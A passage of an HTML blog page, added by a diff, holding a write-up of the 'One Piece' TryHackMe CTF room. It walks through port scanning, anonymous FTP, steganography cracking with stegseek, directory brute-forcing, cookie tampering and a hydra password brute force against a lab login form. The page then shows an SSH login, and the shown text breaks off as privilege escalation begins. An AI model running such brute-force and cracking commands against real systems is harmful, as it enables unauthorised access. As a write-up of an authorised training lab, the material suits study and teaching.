@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="It&amp;rsquo;s been a while I didn&amp;rsquo;t play a CTF on TryHackMe. While searching for a fun room I found one named &amp;ldquo;One Piece&amp;rdquo;. I was like&amp;hellip;wait, why is this not already done? Who would not want to do a CTF on One Piece? c&amp;rsquo;mon! let&amp;rsquo;s set sail!
+Enumeration PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10." />
+<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/one-piece/one-piece/" />
+
+
+    <title>
+        
+            One Piece :: Zer0ne blog 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
+    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="One Piece">
+<meta itemprop="description" content="It&rsquo;s been a while I didn&rsquo;t play a CTF on TryHackMe. While searching for a fun room I found one named &ldquo;One Piece&rdquo;. I was like&hellip;wait, why is this not already done? Who would not want to do a CTF on One Piece? c&rsquo;mon! let&rsquo;s set sail!
+Enumeration PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10."><meta itemprop="datePublished" content="2024-01-17T22:30:00+01:00" />
+<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
+<meta itemprop="wordCount" content="1949"><meta itemprop="image" content="http://localhost:1313/" />
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="One Piece"/>
+<meta name="twitter:description" content="It&rsquo;s been a while I didn&rsquo;t play a CTF on TryHackMe. While searching for a fun room I found one named &ldquo;One Piece&rdquo;. I was like&hellip;wait, why is this not already done? Who would not want to do a CTF on One Piece? c&rsquo;mon! let&rsquo;s set sail!
+Enumeration PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10."/>
+
+
+
+    <meta property="og:title" content="One Piece" />
+<meta property="og:description" content="It&rsquo;s been a while I didn&rsquo;t play a CTF on TryHackMe. While searching for a fun room I found one named &ldquo;One Piece&rdquo;. I was like&hellip;wait, why is this not already done? Who would not want to do a CTF on One Piece? c&rsquo;mon! let&rsquo;s set sail!
+Enumeration PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/one-piece/one-piece/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2024-01-17T22:30:00+01:00" />
+<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />
+
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2024-01-17 22:30:00 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://localhost:1313/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">#&gt;</span>
+            <span class="logo__text">0/1</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/one-piece/one-piece/">One Piece</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p><img src="http://localhost:1313/thm/One%20Piece/luffy.jpeg" alt="One Piece"></p>
+<p>It&rsquo;s been a while I didn&rsquo;t play a CTF on TryHackMe. While searching for a fun room I found one named &ldquo;One Piece&rdquo;.
+I was like&hellip;wait, why is this not already done? Who would not want to do a CTF on One Piece? c&rsquo;mon! let&rsquo;s set sail!</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     syn-ack vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.8.4.19
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 011818f9b78ac36c7f922d939055a129 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC45MSZ6fV/xyKjd0Vlj750dJSO5TPl1lrNfd+t+qc4LIKnaMoUsyIuxlnTOSQ0yHhGCxRYaDheybyGr1JqQrFazro9bL5cr3o0LQYLgTWbTcVAgkByqDvblrqUj1c6O4R0Z3BoppqzBgXIsUJFw96HAiYzVJCh9RN2rGnAHmqy8lIS/Z56pFlmiEOc3/W1ccnA/ABAIWkX25Kpxz+QE1eMEWEswLG57qmG8nt0qkOT6hQ9sskVW/ADnUmY3rO/dsP7TXh/IvI1slb6HALUlQXXfGUp/2CwOS7SfIthom8HJ3s7STVVOiAQM6xw6USA9QFLObcUSV0qHpXzJnyQtqtl
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> cc0218a9b52b49e45b77f96ec2dbc90d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLQ8y5fOAYcijtTXLprC5JojtRJvMIvbUGGFTMN5eYol3XZucpVKnt/fyLV/5x1jWXsnQixuE2QMCJ6hNRGwHgw<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b85272e62ad57e563d167bbc518c7b2a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWb4BgTYBRRA6bswNkUVwbviPydKMyyWsLyspHwzc/B
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: C31581B251EA41386CB903FC27B37692
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: OPTIONS HEAD GET POST
+</span></span><span style="display:flex;"><span>|_http-title: New World
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>First the ftp service. We can login anonymously so let&rsquo;s get &rsquo;em</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>13:06:33<span style="color:#f92672">)</span>──&gt; ftp 10.10.194.115                                                                                                    ──<span style="color:#f92672">(</span>mar.,janv.16<span style="color:#f92672">)</span>─┘
+</span></span><span style="display:flex;"><span>Connected to 10.10.194.115.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.194.115:nairolf32<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|60312|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">187</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> welcome.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get welcome.txt
+</span></span><span style="display:flex;"><span>local: welcome.txt remote: welcome.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|24304|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> welcome.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">187</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |***********************************************************************************************************|   <span style="color:#ae81ff">187</span>      216.62 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span> bytes received in 00:00 <span style="color:#f92672">(</span>1.08 KiB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The welcome file is not very useful. Mostly stuff about Zou island</p>
+<p>Silly me</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; ls -al
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|5436|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .the_whale_tree
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">187</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> welcome.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span></code></pre></div><p>Good old hidden files. Let&rsquo;s get it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; cd .the_whale_tree
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Directory successfully changed.
+</span></span><span style="display:flex;"><span>ftp&gt; ls -al
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|21545|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">8652</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .road_poneglyph.jpeg
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">1147</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .secret_room.txt
+</span></span></code></pre></div><p>Anyways, we got a <code>road_poneglyph.jpeg</code> and a <code>secret_room.txt</code> from <code>the whale</code>. The first poneglyph looks like blatant steganography. jpeg = steghide (sometimes) but first I make sure it&rsquo;s a jpeg using <code>file</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>13:24:39 on master ✭<span style="color:#f92672">)</span>──&gt; file .road_poneglyph.jpeg                                                                                ──<span style="color:#f92672">(</span>mar.,janv.16<span style="color:#f92672">)</span>─┘
+</span></span><span style="display:flex;"><span>.road_poneglyph.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 270x187, components <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>13:25:52 on master ✭<span style="color:#f92672">)</span>──&gt; steghide --extract -sf .road_poneglyph.jpeg                                                              ──<span style="color:#f92672">(</span>mar.,janv.16<span style="color:#f92672">)</span>─┘
+</span></span><span style="display:flex;"><span>Entrez la passphrase: 
+</span></span><span style="display:flex;"><span>�criture des donn�es extraites dans <span style="color:#e6db74">&#34;road_poneglyphe1.txt&#34;</span>.
+</span></span></code></pre></div><p>Got <code>road_poneglyphe1.txt</code> But wait&hellip;there is more! Back to the kitchen with the contents we use a special sauce mixing</p>
+<p>base32, morse, Binary, hex&hellip;then??? <code>3HTXi9i2T2</code> &hellip;. I don&rsquo;t know what to do with that&hellip;</p>
+<p>Let&rsquo;s keep it for later. Maybe we need to assemble them (anime vibes 101)</p>
+<p>More exploration!</p>
+<p>On the website we get a beautiful picture of the crew with the merry go</p>
+<p>The source code reveals this:</p>
+<!-- raw HTML omitted -->
+<p>We run to the kitchen (cyberchef) and we got something about nami being a silly navigator:</p>
+<p>&ldquo;Nami ensures there are precisely 3472 possible places where she could have lost it.&rdquo;</p>
+<p>And gentlemen this is where we got stuck! The hint at first made no sense to me: &ldquo;Only Sea, I&rsquo;ts Not Terrible&rdquo;&hellip;ooohhh&hellip;OSINT!</p>
+<p>That&rsquo;s terrible! Who would have thought of that? We do some &ldquo;searching&rdquo; but damn it&rsquo;s so guessy&hellip;I usually like OSINT but damn&hellip;why here?</p>
+<p>We get this <a href="https://github.com/1FreyR/LogPose/blob/master/LogPose.txt">github link</a> and we get a <a href="http://localhost:1313/thm/One%20Piece/LogPose.txt">LogPose.txt</a> file</p>
+<p>We use it with gobuster to find our next destination. Don&rsquo;t worry I won&rsquo;t edit the directory name&hellip;it&rsquo;s on me&hellip;No one deserve this suffering</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>14:27:51 on master ✭<span style="color:#f92672">)</span>──&gt; gobuster dir -w LogPose.txt -u http://10.10.135.84 -x html,php,txt    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/dr3ssr0s4.html       <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3985<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Lol When I saw &ldquo;dressrosa&rdquo; I knew It would be <code>Donquixote Doflamingo</code>. There are multiple div elemeents overlaying an image named &ldquo;rabbit_hole.png&rdquo;. I know it&rsquo;s tempting but when the author himself says it&rsquo;s a rabbit hole&hellip;it&rsquo;s a rabbit hole!</p>
+<p>We got stuck again&hellip;for a while.  We ended up exploring the css of the page (who even do that???) and unlocked the gear fourth</p>
+<p><img src="http://localhost:1313/thm/One%20Piece/king_kong_gun.jpg" alt="king kong gun"></p>
+<pre tabindex="0"><code class="language-strings" data-lang="strings">└─(14:44:36 on master ✭)──&gt; strings king_kong_gun.jpg                                                                                ──(mar.,janv.16)─┘
+JFIF
+Doflamingo is /ko.jpg
+</code></pre><p>Use <code>strings</code> again and find our next destination. it&rsquo;s <code>whole cake</code> if you wonder. We get input field and a button. I immediately fire burp suite and intercept the request. Funny how it&rsquo;s a <code>cookie</code> we have to tamper with. I had a terrible experience with those encoded texts (mostly rabbit holes&hellip;so many rabbit holes)</p>
+<p>We get the 2nd poneglyph then focus on &ldquo;random island&rdquo; instead&hellip;Seems like <code>buggy the clown</code> is our friend now.</p>
+<p>As checking the source code is very important here we check everything&hellip;The css, the javascript&hellip;Everything! We find our next destination in <code>brain_teaser.js</code>. It&rsquo;s <code>Onigashima</code> where we fight <code>Kaido of the beasts</code>. We have two options. A login form and an upload form. Also a hint about &ldquo;bruteforce&rdquo; or something (I don&rsquo;t like bruteforcing much)</p>
+<p>I was stuck again but once again I got a little help about steganography on the kaido image</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>15:16:50 on master ✭<span style="color:#f92672">)</span>──&gt; stegseek -wl /usr/share/wordlists/rockyou.txt -sf kaido.jpeg                                             ──<span style="color:#f92672">(</span>mar.,janv.16<span style="color:#f92672">)</span>─┘
+</span></span><span style="display:flex;"><span>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found passphrase: <span style="color:#e6db74">&#34;imabeast&#34;</span>       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Original filename: <span style="color:#e6db74">&#34;kaido_login.txt&#34;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Extracting to <span style="color:#e6db74">&#34;kaido.jpeg.out&#34;</span>.
+</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
+<p><img src="http://localhost:1313/thm/One%20Piece/kaido.jpeg" alt="kaido"></p>
+<p>Cool. The username to use is known we need the password now&hellip;maybe&hellip;bruteforce?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>15:25:11 on master ✭<span style="color:#f92672">)</span>──&gt; hydra -l K1ng_0f_th3_B3@sts -P <span style="color:#e6db74">&#34;/usr/share/wordlists/rockyou.txt&#34;</span> 10.10.135.85 http-post-form <span style="color:#e6db74">&#34;/0n1g4sh1m4.php:user=^USER^&amp;password=^PASS^&amp;submit_creds=Login:ERROR&#34;</span>
+</span></span><span style="display:flex;"><span>Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2024-01-16 15:26:02
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.135.85:80/0n1g4sh1m4.php:user<span style="color:#f92672">=</span>^USER^&amp;password<span style="color:#f92672">=</span>^PASS^&amp;submit_creds<span style="color:#f92672">=</span>Login:ERROR
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 32.00 tries/min, <span style="color:#ae81ff">32</span> tries in 00:01h, <span style="color:#ae81ff">14344374</span> to <span style="color:#66d9ef">do</span> in 7471:02h, <span style="color:#ae81ff">16</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 32.00 tries/min, <span style="color:#ae81ff">96</span> tries in 00:03h, <span style="color:#ae81ff">14344336</span> to <span style="color:#66d9ef">do</span> in 7471:01h, <span style="color:#ae81ff">16</span> active
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>quite long&hellip;You need a lot of patience here (damn I hate bruteforce)</p>
+<p>After getting the password we login and get the 3rd poneglyph also this&hellip;</p>
+<p>&ldquo;You succeed to run away and there is only one Road Poneglyph left to find to be able to reach Laugh Tale.
+Unfortunately, the location of this last Poneglyph is unspecified.&rdquo;</p>
+<p>Once again very infuriating situation&hellip;you won&rsquo;t believe what the author did here&hellip;</p>
+<p>visit <code>/unspecified</code>&hellip;yeah that&rsquo;s right&hellip;That was the solution!!</p>
+<p>the last poneglyph is there so I assembled all four and decoded them all with the same sauce</p>
+<p>ssh with the credentials you just got</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>17:27:07 on master ✭<span style="color:#f92672">)</span>──&gt; ssh M0nk3y_D_7uffy@10.10.80.106                                                                    <span style="color:#ae81ff">255</span> ↵ ──<span style="color:#f92672">(</span>mar.,janv.16<span style="color:#f92672">)</span>─┘
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.80.106 (10.10.80.106)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:zOHT7dbvRJlqSe19yomTmKvQHVgvwDLd7X8gGWScz84.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.80.106<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">M0nk3y_D_7uffy@10.10.80.106&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-041500-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span> updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Fri Aug <span style="color:#ae81ff">14</span> 15:23:58 <span style="color:#ae81ff">2020</span> from 192.168.1.7
+</span></span><span style="display:flex;"><span>M0nk3y_D_7uffy@Laugh-Tale:~$ ls
+</span></span><span style="display:flex;"><span>laugh_tale.txt
+</span></span><span style="display:flex;"><span>M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt
+</span></span><span style="display:flex;"><span>Finally, we reached Laugh Tale.
+</span></span><span style="display:flex;"><span>All is left to <span style="color:#66d9ef">do</span> is to find the One Piece.
+</span></span><span style="display:flex;"><span>Wait, there is another boat in here.
+</span></span><span style="display:flex;"><span>Be careful, it is the boat of Marshall D Teach, one of the <span style="color:#ae81ff">4</span> Emperors. He is the one that led your brother Ace to his death.
+</span></span><span style="display:flex;"><span>You want your revenge. Let<span style="color:#960050;background-color:#1e0010">&#39;</span>s take him down !
+</span></span></code></pre></div><p>We reached laugh tale!</p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p><code>Marshall D teach</code> is here too</p>
+<p>We try the classics&hellip;<code>sudo -l</code> didnt work but the SUID binaries are interesting</p>
